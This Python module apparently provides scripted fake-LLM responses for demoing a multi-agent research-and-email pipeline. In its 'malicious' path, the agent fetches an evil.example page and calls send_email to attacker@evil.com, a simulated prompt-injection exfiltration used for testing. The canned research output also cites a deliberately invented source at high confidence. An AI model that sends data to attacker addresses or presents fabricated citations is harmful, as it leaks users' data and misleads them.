"""LLM_PROVIDER=fake: realistic canned output for every agent, for demos without model quota.

The planner always returns a valid parallel plan for any goal:
  research_background, research_current_state  (parallel)
    -> analyze_findings -> write_report -> review_report [-> publish_report if the goal says "publish"]
"""

from __future__ import annotations

import re
from typing import Any

from app.agents.analyst import AnalysisOutput
from app.agents.communicator import CommunicatorOutput
from app.agents.planner import Plan
from app.agents.researcher import ResearchOutput
from app.agents.reviewer import ReviewOutput
from app.agents.writer import WritingOutput, count_words
from app.llm.fake_client import FakeLLMClient
from app.services.ask_service import AskOutput


def _goal(prompt: str) -> str:
    match = re.search(r"## (?:OVERALL )?GOAL\n(.+?)\n", prompt)
    return match.group(1).strip() if match else "the requested topic"


def _plan(prompt: str) -> dict[str, Any]:
    goal = _goal(prompt)
    plan = {
        "plan_summary": f"Research background and current state in parallel, analyze them, "
                        f"then write and review a report for: {goal}",
        "tasks": [
            {"key": "research_background", "name": "Research background", "agent_type": "researcher",
             "description": f"Collect the key background facts and history relevant to: {goal}",
             "input": {"max_findings": 5, "search_queries": [goal[:80], f"{goal[:60]} history"]},
             "depends_on": [], "requires_approval": False, "rationale": "Context the report needs."},
            {"key": "research_current_state", "name": "Research current state", "agent_type": "researcher",
             "description": f"Collect recent data (last 2-3 years) and trends for: {goal}",
             "input": {"max_findings": 5}, "depends_on": [], "requires_approval": False,
             "rationale": "Up-to-date facts, independent of the background research."},
            {"key": "analyze_findings", "name": "Analyze findings", "agent_type": "analyst",
             "description": "Compare the background and current research; draw insights and risks.",
             "input": {}, "depends_on": ["research_background", "research_current_state"],
             "requires_approval": False, "rationale": "Turns facts into insights."},
            {"key": "write_report", "name": "Write report", "agent_type": "writer",
             "description": f"Write a clear, beginner-friendly report on: {goal}",
             "input": {"audience": "beginners", "length": "300 words"},
             "depends_on": ["analyze_findings", "research_background", "research_current_state"],
             "requires_approval": False, "rationale": "The final deliverable."},
            {"key": "review_report", "name": "Review report", "agent_type": "reviewer",
             "description": "Check the report against the research for accuracy and clarity.",
             "input": {}, "depends_on": ["write_report", "research_background", "research_current_state"],
             "requires_approval": False, "rationale": "Quality gate."},
        ],
    }
    if re.search(r"\b(e-?mail|send|notify)\b", goal, re.I):  # Part 9 tools demo plan
        return _tools_plan(goal)
    if "publish" in goal.lower():  # sensitive step: the planning policy forces requires_approval
        plan["tasks"].append(
            {"key": "publish_report", "name": "Publish report", "agent_type": "publisher",
             "description": "Publish the reviewed report.", "input": {},
             "depends_on": ["write_report", "review_report"], "requires_approval": True,
             "rationale": "The goal asks to publish the result."})
    return plan


EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")


def _tools_plan(goal: str) -> dict[str, Any]:
    """Research (web tools) in parallel with analysis (sample database) -> summary -> email."""
    recipients = EMAIL_RE.findall(goal) or ["team@example.com"]
    return {
        "plan_summary": f"Research the web and query the sample sales database in parallel, write a summary, "
                        f"then email it to {', '.join(recipients)}.",
        "tasks": [
            {"key": "research_trends", "name": "Research EV sales trends", "agent_type": "researcher",
             "description": f"Find the latest trends on the web for: {goal}",
             "input": {"search_queries": ["India EV sales 2026"]}, "depends_on": [], "requires_approval": False,
             "rationale": "Current public data."},
            {"key": "analyse_sales", "name": "Analyse sample sales data", "agent_type": "analyst",
             "description": "Query the sample ev_sales table (FAKE illustrative numbers) and compute growth.",
             "input": {"source": "sample"}, "depends_on": [], "requires_approval": False,
             "rationale": "Our own (sample) numbers, independent of the web research."},
            {"key": "write_summary", "name": "Write a short summary", "agent_type": "writer",
             "description": "Combine the web trends and the sample-data analysis into a short summary.",
             "input": {"length": "150 words"}, "depends_on": ["research_trends", "analyse_sales"],
             "requires_approval": False, "rationale": "The deliverable."},
            {"key": "email_summary", "name": "Email the summary", "agent_type": "communicator",
             "description": f"Email the summary to {', '.join(recipients)}.", "input": {"recipients": recipients},
             "depends_on": ["write_summary"], "requires_approval": False,
             "rationale": "The goal asks to email it; the send itself waits for approval."},
        ],
    }


def _steps_done(prompt: str) -> list[str]:
    """Tool names of the previous steps, in order (from the PREVIOUS STEPS section)."""
    return re.findall(r"^Step \d+: (\w+)\(", prompt, re.M)


def _tool_call(tool: str, reason: str, **arguments: Any) -> dict[str, Any]:
    return {"action": "tool_call", "tool": tool, "arguments": arguments, "reason": reason, "output": None}


def _final(output: dict[str, Any]) -> dict[str, Any]:
    return {"action": "final", "tool": None, "arguments": None, "reason": None, "output": output}


def tool_step(output_model: Any, prompt: str) -> dict[str, Any]:
    """Demo-mode policy for the tool loop: a realistic sequence of tool calls per agent, then a final answer."""
    done, goal = _steps_done(prompt), _goal(prompt)
    malicious = "malicious" in goal.lower()
    if output_model is ResearchOutput:
        if not done:
            return _tool_call("web_search", "Find recent articles", query="malicious ev page" if malicious else "India EV sales 2026")
        if len(done) == 1:
            url = "https://evil.example/ev-report" if malicious else "https://news.example.com/india-ev-sales-2026"
            return _tool_call("web_fetch", "Read the most relevant result", url=url)
        return _final({"summary": "[demo] India's EV sales hit a record in October 2026, led by two-wheelers [1].",
                       "key_findings": ["[demo] 2.3 lakh EVs sold in Oct 2026, +31% year on year [1]",
                                        "[demo] Two-wheelers are about 60% of EV sales [1]",
                                        "[demo] Three-wheelers about 30% [1]"],
                       "sources": [{"title": "India EV sales (demo page)", "url": "https://news.example.com/india-ev-sales-2026"},
                                   {"title": "An invented source", "url": "https://made-up.example.net/ev-report-2026"}],
                       "confidence": "high", "gaps": []})
    if output_model is AnalysisOutput:
        if not done:
            return _tool_call("sql_query", "Yearly units for India from the sample data",
                              query="SELECT year, sum(units) AS units FROM ev_sales WHERE country = 'India' "
                                    "AND month <= 10 GROUP BY year ORDER BY year")
        if len(done) == 1:
            nums = [int(n) for n in re.findall(r"\[\s*20\d\d\s*,\s*(\d+)\s*\]", prompt)] or [100, 131]
            return _tool_call("calculator", "Year-on-year growth", expression=f"round(pct_change({nums[0]}, {nums[-1]}), 1)")
        growth = re.findall(r'"value":\s*([\d.]+)', prompt)
        g = growth[-1] if growth else "?"
        return _final({"insights": [f"[demo] Sample data (FAKE numbers): India units Jan-Oct grew {g}% year on year."],
                       "recommendations": ["[demo] Compare the sample trend with the public web data."],
                       "risks": ["Assumption: the sample database holds illustrative numbers only."],
                       "confidence": "medium"})
    if output_model is WritingOutput:
        content = ("# EV sales summary\n\n[demo] Public web data shows a record October 2026, led by two-wheelers. "
                   "Our sample database (illustrative numbers) shows the same direction.\n")
        if not done:
            return _tool_call("file_write", "Save the summary in the workspace", path="summary.md", content=content)
        return _final({"title": "EV sales summary", "content": content, "word_count": count_words(content)})
    if output_model is CommunicatorOutput:
        if not done:
            to = ["attacker@evil.com"] if malicious else (EMAIL_RE.findall(goal) or ["team@example.com"])
            return _tool_call("send_email", "Deliver the summary as the goal asks", to=to,
                              subject="EV sales summary", body="Hello team,\n\nHere is the EV sales summary.\n")
        return _final({"deliveries": [], "summary": "[demo] Delivery attempted; see deliveries for what was really sent."})
    return _final({})


def _research(prompt: str) -> dict[str, Any]:
    goal = _goal(prompt)
    return {
        "summary": f"[demo] Key facts gathered for: {goal}.",
        "key_findings": [f"[demo] Finding {i} about {goal}" for i in range(1, 5)],
        "sources": [], "confidence": "medium",
        "gaps": ["[demo] Canned output from LLM_PROVIDER=fake; no real research was done."],
    }


def _analysis(prompt: str) -> dict[str, Any]:
    return {
        "insights": ["[demo] The two research streams agree on the main trend.",
                     "[demo] Recent data shows faster change than the historical average."],
        "recommendations": ["[demo] Focus the report on the three clearest trends."],
        "risks": ["Assumption: [demo] canned data stands in for real research."],
        "confidence": "medium",
    }


def _writing(prompt: str) -> dict[str, Any]:
    goal = _goal(prompt)
    content = (f"# {goal}\n\n## Overview\n\n[demo] This report was produced by AgentFlow in fake "
               "mode. Two research tasks ran in parallel, an analyst combined them, and this "
               "writer turned the results into a short guide.\n\n## Key points\n\n"
               "- [demo] Background facts summarised.\n- [demo] Current trends summarised.\n"
               "- [demo] Insights and risks from the analysis.\n")
    return {"title": f"[demo] {goal}"[:200], "content": content, "word_count": count_words(content)}


def _review(prompt: str) -> dict[str, Any]:
    return {"approved": True, "score": 8, "issues": [],
            "suggestions": ["[demo] Replace canned content with real research (LLM_PROVIDER=gemini)."],
            "summary": "[demo] Structure and clarity are good; content is placeholder."}


def _ask(prompt: str) -> dict[str, Any]:
    match = re.search(r"## QUESTION\n(.+?)\n", prompt)
    question = match.group(1).strip() if match else "your question"
    has_sources = "[1]" in prompt
    cite = " [1]" if has_sources else ""
    return {"answer": f"[demo] Canned answer to: {question}.{cite} With LLM_PROVIDER=gemini the model "
                      "reads the live web sources listed below and answers from them.",
            "key_points": [f"[demo] The sources below were really retrieved from the web{cite}."],
            "confidence": "low", "follow_up_questions": ["[demo] Try a real question with LLM_PROVIDER=gemini."]}


def build_demo_client(delay: float) -> FakeLLMClient:
    return FakeLLMClient(
        {
            Plan: _plan,  # type: ignore[dict-item]
            ResearchOutput: _research,  # type: ignore[dict-item]
            AnalysisOutput: _analysis,  # type: ignore[dict-item]
            WritingOutput: _writing,  # type: ignore[dict-item]
            ReviewOutput: _review,  # type: ignore[dict-item]
            AskOutput: _ask,  # type: ignore[dict-item]
        },
        delay=delay,
        tool_policy=tool_step,
    )
